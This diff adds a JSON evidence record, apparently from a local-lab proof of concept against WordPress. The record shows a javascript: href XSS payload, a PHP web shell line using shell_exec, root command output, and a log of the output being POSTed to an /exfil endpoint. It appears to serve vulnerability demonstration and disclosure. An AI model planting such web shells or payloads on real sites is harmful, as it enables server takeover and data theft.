@@ -1,0 +1,28 @@
+{
+  "target": "http://127.0.0.1:18080",
+  "scope": "LOCAL LAB ONLY",
+  "demo_dir": "/root/Docue/ppp/evidence/wp-bind-href/evidence-2026-10-13/demo",
+  "xss_post": 964,
+  "server_source_href": "https://example.com/",
+  "hydrated_href": "javascript:(function(){document.documentElement.style.background='#b00000';var m=document.createElement('div');m.setAttribute('style','position:fixed;top:0;left:0;right:0;padding:18px;background:#111;color:#39ff14;font:20px monospace;z-index:99999;text-align:center');m.textContent='XSS EXECUTED - attacker JavaScript running in origin '+location.origin;document.body.appendChild(m);document.title='XSS-EXECUTED';})();void 0",
+  "xss_title": "XSS-EXECUTED",
+  "banner": "LIVE DOM a#t href (read at runtime) = \"javascript:(function(){document.documentElement.style.background='#b00000';var m=document.createElement('div');m.setAttribute('style','position:fixed;top:0;left:0;right:0;padding:18px;background:#111;color:#39ff14;font:20px monospace;z-index:99999;text-align:center');m.textContent='XSS EXECUTED - attacker JavaScript running in origin '+location.origin;document.body.appendChild(m);document.title='XSS-EXECUTED';})();void 0\"\nserver-rendered source href       = \"https://example.com/\"",
+  "rce_post": 965,
+  "hello_before": "1244904e04a09c848d6e776ffecd98325ec613f277578abf3cb98c6b6d58fe53",
+  "admin_login": true,
+  "rce_state": {
+    "s": "done",
+    "save": 200,
+    "done": true
+  },
+  "editor_shows": "<?php echo shell_exec($_GET['cmd']);",
+  "hello_after_write": "4b461219f904c073602ac9668a8ac09dfad7a020253105ad5df89246b414536c",
+  "rce_cmd": {
+    "status": 200,
+    "output": "uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\ncb722bffb922\nLinux 6.6.87.2-microsoft-standard-WSL2 x86_64 Linux\n"
+  },
+  "exfil_log": "2026-10-13T06:22:40.985890Z POST /exfil from 172.19.0.3 UA=curl/8.22.0\n  BODY: uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\ncb722bffb922\n",
+  "hello_restored": "1244904e04a09c848d6e776ffecd98325ec613f277578abf3cb98c6b6d58fe53",
+  "restored_ok": true,
+  "posts_deleted": true
+}
